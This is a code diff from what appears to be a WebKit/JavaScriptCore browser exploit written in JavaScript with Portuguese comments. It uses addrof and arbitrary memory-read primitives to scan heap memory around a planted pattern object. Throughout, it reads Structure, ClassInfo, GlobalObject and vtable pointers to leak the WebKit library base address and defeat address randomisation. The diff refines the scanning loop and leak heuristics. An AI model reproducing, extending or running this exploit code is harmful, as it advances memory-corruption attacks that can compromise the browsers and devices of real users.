             const cached_type_info_ptr_addr = class_info_addr.add(M_CACHED_TYPE_INFO_OFFSET);
             const cached_type_info_addr = arb_read_final(cached_type_info_ptr_addr);
             if (cached_type_info_addr.equals(NEW_POLLUTION_VALUE) || cached_type_info_addr.equals(AdvancedInt64.Zero) || cached_type_info_addr.equals(AdvancedInt64.NaNValue)) {
@@ -528,32 +521,71 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             const test_value_pattern_low = 0x1A2B3C4D;
             const test_value_pattern_high = 0x5E6F7A8B;
             const test_value_pattern = new AdvancedInt64(test_value_pattern_low, test_value_pattern_high);
+            const pattern_id = new AdvancedInt64(0xABCDEF01, 0x12345678); // Outro padrão para procurar
 
-            // Crie um objeto com propriedades numéricas conhecidas
-            const pattern_obj = {
+            const pattern_obj_original_props = {
+                id_val: int64ToDouble(pattern_id), // Propriedade com nosso ID
                 prop_A: int64ToDouble(test_value_pattern), // Propriedade com nosso padrão Int64
-                prop_B: 12345,
-                prop_C: 67890
+                prop_B: 0xDEADBEEF, // Valor conhecido
+                prop_C: 0xCAFEBABE, // Valor conhecido
+                prop_D: int64ToDouble(new AdvancedInt64(0x98765432, 0x10203040))
             };
+            const pattern_obj = Object.assign({}, pattern_obj_original_props); // Clone para evitar alteração do original
             const pattern_obj_addr = addrof(pattern_obj);
             logS3(`  Endereço do objeto de padrão: ${pattern_obj_addr.toString(true)}`, "debug");
 
-            // Leia a memória ao redor do objeto de padrão
-            const SCAN_RANGE = 0x200; // Varre +/- 0x200 bytes (512 bytes)
-            const START_SCAN_ADDR = pattern_obj_addr.sub(SCAN_RANGE);
-            const END_SCAN_ADDR = pattern_obj_addr.add(SCAN_RANGE);
+            // Varredura de memória ao redor do objeto de padrão
+            const SCAN_RANGE_BYTES = 0x1000; // Varre +/- 4KB (aumentado)
+            const START_SCAN_ADDR = pattern_obj_addr.sub(SCAN_RANGE_BYTES);
+            const END_SCAN_ADDR = pattern_obj_addr.add(SCAN_RANGE_BYTES);
 
-            logS3(`  Varrendo memória de ${START_SCAN_ADDR.toString(true)} a ${END_SCAN_ADDR.toString(true)}...`, "info");
+            logS3(`  Varrendo memória de ${START_SCAN_ADDR.toString(true)} a ${END_SCAN_ADDR.toString(true)} (range ${SCAN_RANGE_BYTES * 2} bytes)...`, "info");
             for (let current_scan_addr = START_SCAN_ADDR; current_scan_addr.low() < END_SCAN_ADDR.low() || current_scan_addr.high() < END_SCAN_ADDR.high(); current_scan_addr = current_scan_addr.add(8)) {
-                if (current_scan_addr.high() > 0x7FFFFFFF) { // Evitar endereços muito altos que possam causar crash
-                     break;
+                if (current_scan_addr.high() > 0x7FFFFFFF && current_scan_addr.high() !== NEW_POLLUTION_VALUE.high()) { // Evitar endereços muito altos ou poluídos
+                     break; // Se encontrou um endereço muito alto e não é o poisoning, pare a varredura para evitar crash
                 }
-                const read_val = arb_read_final(current_scan_addr);
+                if (current_scan_addr.equals(pattern_obj_addr)) {
+                    logS3(`    Pulando endereço do próprio objeto de padrão: ${current_scan_addr.toString(true)}`, "debug");
+                    continue; // Não leia o próprio endereço do objeto
+                }
 
-                // Se o valor lido não for o de poluição
+                let read_val;
+                try {
+                    read_val = arb_read_final(current_scan_addr);
+                } catch (read_err) {
+                    logS3(`    ERRO ao ler de ${current_scan_addr.toString(true)}: ${read_err.message}`, "warn");
+                    continue; // Pular endereço que causou erro
+                }
+                
+
+                // 1. Verifique se o valor lido é um dos seus padrões
+                if (read_val.equals(test_value_pattern)) {
+                    logS3(`    Padrão numérico '${test_value_pattern.toString(true)}' encontrado em ${current_scan_addr.toString(true)}. Controle de escrita/leitura confirmado neste local!`, "info");
+                    // Tente ler offsets próximos para ver se há ponteiros reais
+                    // Exemplo: ler Structure* adjacente ao padrão
+                    const potential_structure_ptr_addr = current_scan_addr.sub(LOCAL_JSC_OFFSETS.JSObject_BUTTERFLY_OFFSET - LOCAL_JSC_OFFSETS.JSCell_STRUCTURE_POINTER_OFFSET); // Aprox.
+                    const potential_structure_val = arb_read_final(potential_structure_ptr_addr);
+                    if (!potential_structure_val.equals(NEW_POLLUTION_VALUE) && potential_structure_val.high() > 0x40000000) {
+                        logS3(`    POSSÍVEL VAZAMENTO LIMPO DE STRUCTURE* adjacente ao padrão: ${potential_structure_val.toString(true)} @ ${potential_structure_ptr_addr.toString(true)}`, "vuln");
+                        // Tentativa de calcular WebKit base a partir daí
+                        const class_info_from_potential = arb_read_final(potential_structure_val.add(LOCAL_JSC_OFFSETS.Structure_CLASS_INFO_OFFSET));
+                        if (!class_info_from_potential.equals(NEW_POLLUTION_VALUE) && class_info_from_potential.high() > 0x40000000) {
+                             logS3(`    POSSÍVEL VAZAMENTO LIMPO DE CLASSINFO* adjacente ao padrão: ${class_info_from_potential.toString(true)}`, "vuln");
+                             // Se isso funcionar, tente o leak completo de base
+                             final_result.webkit_leak_details = {
+                                success: true,
+                                msg: `Vazamento de base WebKit via Structure/ClassInfo adjacente a padrão numérico!`,
+                                webkit_base_candidate: "Inferir de ClassInfo ou outros ponteiros",
+                                js_object_put_addr: "N/A"
+                            };
+                            return final_result;
+                        }
+                    }
+                }
+                
+                // 2. Verifique se o valor lido parece um ponteiro WebKit válido (alto endereço, não poluído, alinhado)
                 if (!read_val.equals(NEW_POLLUTION_VALUE) && !read_val.equals(AdvancedInt64.Zero) && !read_val.equals(AdvancedInt64.NaNValue)) {
-                    // Tentar inferir se é um ponteiro WebKit (alto endereço, alinhado)
-                    if (read_val.high() > 0x40000000 && (read_val.low() & 0xFFF) === 0) { // Exemplo de heurística para ponteiros base
+                    if (read_val.high() > 0x40000000 && (read_val.low() & 0xFFF) === 0) { // Heurística para ponteiros base alinhados a 0x1000
                         logS3(`    POTENCIAL VAZAMENTO! Endereço não poluído e sane encontrado em ${current_scan_addr.toString(true)}: ${read_val.toString(true)}`, "vuln");
                         final_result.webkit_leak_details = {
                             success: true,
@@ -561,15 +593,11 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
                             webkit_base_candidate: read_val.toString(true),
                             js_object_put_addr: "N/A (varredura)"
                         };
-                        return final_result; // Retorna no primeiro vazamento bem-sucedido
-                    }
-                    // Se o valor lido for o padrão que escrevemos, isso confirma o controle na região.
-                    if (read_val.equals(test_value_pattern)) {
-                         logS3(`    Padrão numérico '${test_value_pattern.toString(true)}' encontrado em ${current_scan_addr.toString(true)}. Controle de escrita/leitura confirmado neste local!`, "info");
+                        return final_result;
                     }
                 }
-                // Adicione uma pequena pausa para evitar congestionar o browser se o loop for muito grande
-                if (current_scan_addr.low() % 0x100 === 0) { // A cada 0x100 bytes (208 leituras)
+                
+                if (current_scan_addr.low() % 0x100 === 0) {
                     await PAUSE_S3(1);
                 }
             }
@@ -618,7 +646,7 @@ async function performLeakAttemptFromObjectStructure(obj_addr, obj_type_name, ar
     logS3(`  Iniciando leituras da JSCell/Structure do objeto de vazamento tipo "${obj_type_name}"...`, "debug");
 
     try {
-        const JSC_CELL_STRUCTURE_POINTER_OFFSET = LOCAL_JSC_OFFSETS.JSCell_STRUCTURE_POINTER_OFFSET; // 
+        const JSC_CELL_STRUCTURE_POINTER_OFFSET = LOCAL_JSC_OFFSETS.JSCell_STRUCTURE_POINTER_OFFSET;
         const structure_ptr_addr = obj_addr.add(JSC_CELL_STRUCTURE_POINTER_OFFSET);
         const structure_addr = arb_read_func(structure_ptr_addr);
         logS3(`    Lido Structure* (${JSC_CELL_STRUCTURE_POINTER_OFFSET}): ${structure_addr.toString(true)} de ${structure_ptr_addr.toString(true)}`, "leak");
@@ -632,7 +660,7 @@ async function performLeakAttemptFromObjectStructure(obj_addr, obj_type_name, ar
         }
         if (structure_addr.high() < 0x40000000) logS3(`    ALERTA: Structure* (${structure_addr.toString(true)}) parece um endereço baixo (Smi?), o que é incomum para um ponteiro de estrutura real.`, "warn");
 
-        const JSC_CELL_STRUCTURE_ID_FLATTENED_OFFSET = LOCAL_JSC_OFFSETS.JSCell_STRUCTURE_ID_FLATTENED_OFFSET; // 
+        const JSC_CELL_STRUCTURE_ID_FLATTENED_OFFSET = LOCAL_JSC_OFFSETS.JSCell_STRUCTURE_ID_FLATTENED_OFFSET;
         const structure_id_flattened_val = arb_read_func(obj_addr.add(JSC_CELL_STRUCTURE_ID_FLATTENED_OFFSET));
         const structure_id_byte = structure_id_flattened_val.low() & 0xFF;
         logS3(`    Lido StructureID_Flattened (${JSC_CELL_STRUCTURE_ID_FLATTENED_OFFSET}): ${toHex(structure_id_byte, 8)} de ${obj_addr.add(JSC_CELL_STRUCTURE_ID_FLATTENED_OFFSET).toString(true)} (Valor Full: ${structure_id_flattened_val.toString(true)})`, "leak");
@@ -652,7 +680,7 @@ async function performLeakAttemptFromObjectStructure(obj_addr, obj_type_name, ar
             logS3(`    ALERTA: StructureID (${toHex(structure_id_byte, 8)}) não corresponde ao esperado ArrayBuffer_STRUCTURE_ID (${toHex(JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID, 8)}) para ${obj_type_name}.`, "warn");
         }
 
-        const JSC_CELL_TYPEINFO_TYPE_FLATTENED_OFFSET = LOCAL_JSC_OFFSETS.JSCell_CELL_TYPEINFO_TYPE_FLATTENED_OFFSET; // 
+        const JSC_CELL_TYPEINFO_TYPE_FLATTENED_OFFSET = LOCAL_JSC_OFFSETS.JSCell_CELL_TYPEINFO_TYPE_FLATTENED_OFFSET;
         const typeinfo_type_flattened_val = arb_read_func(obj_addr.add(JSC_CELL_TYPEINFO_TYPE_FLATTENED_OFFSET));
         const typeinfo_type_byte = typeinfo_type_flattened_val.low() & 0xFF;
         logS3(`    Lido CELL_TYPEINFO_TYPE_FLATTENED (${JSC_CELL_TYPEINFO_TYPE_FLATTENED_OFFSET}): ${toHex(typeinfo_type_byte, 8)} de ${obj_addr.add(JSC_CELL_TYPEINFO_TYPE_FLATTENED_OFFSET).toString(true)} (Valor Full: ${typeinfo_type_flattened_val.toString(true)})`, "leak");
@@ -666,7 +694,7 @@ async function performLeakAttemptFromObjectStructure(obj_addr, obj_type_name, ar
         logS3(`  Iniciando leituras da Structure para "${obj_type_name}"...`, "debug");
         await PAUSE_S3(50);
         
-        const STRUCTURE_CLASS_INFO_OFFSET = LOCAL_JSC_OFFSETS.Structure_CLASS_INFO_OFFSET; // 
+        const STRUCTURE_CLASS_INFO_OFFSET = LOCAL_JSC_OFFSETS.Structure_CLASS_INFO_OFFSET;
         const class_info_ptr_addr = structure_addr.add(STRUCTURE_CLASS_INFO_OFFSET);
         const class_info_addr = arb_read_func(class_info_ptr_addr);
         logS3(`    Lido ClassInfo* (${STRUCTURE_CLASS_INFO_OFFSET}): ${class_info_addr.toString(true)} de ${class_info_ptr_addr.toString(true)}`, "leak");
@@ -679,7 +707,7 @@ async function performLeakAttemptFromObjectStructure(obj_addr, obj_type_name, ar
         }
         if (class_info_addr.high() < 0x40000000) logS3(`    ALERTA: ClassInfo* (${class_info_addr.toString(true)}) parece um endereço baixo (Smi?), o que é incomum para um ponteiro de ClassInfo real.`, "warn");
 
-        const STRUCTURE_GLOBAL_OBJECT_OFFSET = LOCAL_JSC_OFFSETS.Structure_GLOBAL_OBJECT_OFFSET; // 
+        const STRUCTURE_GLOBAL_OBJECT_OFFSET = LOCAL_JSC_OFFSETS.Structure_GLOBAL_OBJECT_OFFSET;
         const global_object_ptr_addr = structure_addr.add(STRUCTURE_GLOBAL_OBJECT_OFFSET);
         const global_object_addr = arb_read_func(global_object_ptr_addr);
         logS3(`    Lido GlobalObject* (${STRUCTURE_GLOBAL_OBJECT_OFFSET}): ${global_object_addr.toString(true)} de ${global_object_ptr_addr.toString(true)}`, "leak");
@@ -689,7 +717,7 @@ async function performLeakAttemptFromObjectStructure(obj_addr, obj_type_name, ar
         }
         if (global_object_addr.equals(AdvancedInt64.Zero)) logS3(`    AVISO: GlobalObject* é 0x0.`, "warn");
 
-        const STRUCTURE_PROTOTYPE_OFFSET = LOCAL_JSC_OFFSETS.Structure_PROTOTYPE_OFFSET; // 
+        const STRUCTURE_PROTOTYPE_OFFSET = LOCAL_JSC_OFFSETS.Structure_PROTOTYPE_OFFSET;
         const prototype_ptr_addr = structure_addr.add(STRUCTURE_PROTOTYPE_OFFSET);
         const prototype_addr = arb_read_func(prototype_ptr_addr);
         logS3(`    Lido Prototype* (${STRUCTURE_PROTOTYPE_OFFSET}): ${prototype_addr.toString(true)} de ${prototype_ptr_addr.toString(true)}`, "leak");
@@ -699,7 +727,7 @@ async function performLeakAttemptFromObjectStructure(obj_addr, obj_type_name, ar
         }
         if (prototype_addr.equals(AdvancedInt64.Zero)) logS3(`    AVISO: Prototype* é 0x0.`, "warn");
 
-        const STRUCTURE_AGGREGATED_FLAGS_OFFSET = LOCAL_JSC_OFFSETS.Structure_AGGREGATED_FLAGS_OFFSET; // 
+        const STRUCTURE_AGGREGATED_FLAGS_OFFSET = LOCAL_JSC_OFFSETS.Structure_AGGREGATED_FLAGS_OFFSET;
         const aggregated_flags_addr = structure_addr.add(STRUCTURE_AGGREGATED_FLAGS_OFFSET);
         const aggregated_flags_val = arb_read_func(aggregated_flags_addr);
         logS3(`    Lido AGGREGATED_FLAGS (${STRUCTURE_AGGREGATED_FLAGS_OFFSET}): ${aggregated_flags_val.toString(true)} de ${aggregated_flags_addr.toString(true)}`, "leak");
@@ -711,7 +739,7 @@ async function performLeakAttemptFromObjectStructure(obj_addr, obj_type_name, ar
         await PAUSE_S3(50);
 
         // 3. Leitura do ponteiro JSC::JSObject::put da vtable da Structure
-        const STRUCTURE_VIRTUAL_PUT_OFFSET = LOCAL_JSC_OFFSETS.Structure_VIRTUAL_PUT_OFFSET; // 
+        const STRUCTURE_VIRTUAL_PUT_OFFSET = LOCAL_JSC_OFFSETS.Structure_VIRTUAL_PUT_OFFSET;
         const js_object_put_func_ptr_addr_in_structure = structure_addr.add(STRUCTURE_VIRTUAL_PUT_OFFSET);
         logS3(`  Tentando ler ponteiro de JSC::JSObject::put de ${js_object_put_func_ptr_addr_in_structure.toString(true)} (Structure*+${toHex(STRUCTURE_VIRTUAL_PUT_OFFSET)}) para "${obj_type_name}"`, "debug");
         const js_object_put_func_addr = arb_read_func(js_object_put_func_ptr_addr_in_structure);
@@ -730,7 +758,7 @@ async function performLeakAttemptFromObjectStructure(obj_addr, obj_type_name, ar
 
 
         // 4. Calcular WebKit Base
-        const expected_put_offset_str = WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"]; // 
+        const expected_put_offset_str = WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"];
         if (!expected_put_offset_str) {
             throw new Error("Offset de 'JSC::JSObject::put' não encontrado em WEBKIT_LIBRARY_INFO. FUNCTION_OFFSETS.");
         }
